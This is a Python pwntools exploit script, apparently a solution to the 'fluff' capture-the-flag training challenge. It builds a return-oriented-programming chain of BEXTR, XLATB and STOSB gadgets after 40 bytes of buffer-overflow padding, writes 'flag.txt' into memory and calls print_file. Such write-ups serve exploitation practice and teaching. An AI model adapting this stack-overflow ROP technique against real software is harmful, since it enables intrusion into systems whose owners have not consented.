from pwn import *

POP_RDI = 0x4006a3
DATA = 0x601028
BSS = 0x601038
PRINT_FILE = 0x400510
STOSB_BYTE_PTR_RDI_AL = 0x400639
XLATB = 0x400628
POP_RDX_POP_RCX_ADD_RCX_0x3ef2_BEXTR_RBX_RCX_RDX = 0x40062a
MOV_EAX_0_POP_RBP = 0x400610

filename = ['f','l','a','g','.','t','x','t']
filename_locations = []
for char in filename:
    char_as_bytes = str.encode(char)
    # use relative location because binary starts at 
    # 0x400000 and the function returns 0x3c4 which is really 0x4003c4 (important later)
    relative_location = hex(open("fluff", "rb").read().find(char_as_bytes))
    filename_locations.append(relative_location)
    # returns an array of the relative byte locations of the characters in our filename array

# create a list of the actual memory locations of our characters
actual_locations = []
for location in filename_locations:
    actual_location = int(location, 16) + 0x400000
    actual_locations.append(hex(actual_location))

for loc in filename_locations:
    print(loc)
for aloc in actual_locations:
    print(aloc)

# p = process("./fluff")

payload = b'A' * 40
i = 0
cur_rax = 0xb
for adr in actual_locations:
    # payload += p64(MOV_EAX_0_POP_RBP) # we should clear RAX(EAX) by setting it to 0 in >
    # payload += p64(0x0)            # junk data for RBP
    if(i != 0):
        cur_rax = ord(filename[i-1])

    payload += p64(POP_RDX_POP_RCX_ADD_RCX_0x3ef2_BEXTR_RBX_RCX_RDX)    # BEXTR in this case extracts bytes from RCX and places them in RBX, while RDX has a role of control register, dictating how many bytes and from which index are extracted
    payload += p64(0x4000) # this value if put into RDX will be correct for RDX as control register for BEXTR operation (BEXTR will extract all 24 bits or 3 bytes from the actual address of each character in 'flag.txt', and put it into RBX)
    payload += p64(int(adr, 16) - 0x3ef2 - cur_rax)     # value into RCX is actual address of each character in the string 'flag.txt' found in the binary, subtracted by 0x3ef2 because 0x3ef2 will in the next instruction in the gadget be added to RCX
    payload += p64(XLATB)          # XLATB takes a byte value from address pointed to by RBX (RBX now in each iteration of the loop contains absolute(actual) address of a character from 'flag.txt' string)
    payload += p64(POP_RDI)
    payload += p64(BSS + i)
    payload += p64(STOSB_BYTE_PTR_RDI_AL)
    i += 1
    # pause()
# pause()
payload += p64(POP_RDI)
payload += p64(BSS)
payload += p64(PRINT_FILE)
elf = context.binary = ELF("fluff")
p = process(elf.path)
p.sendline(payload)
p.interactive()

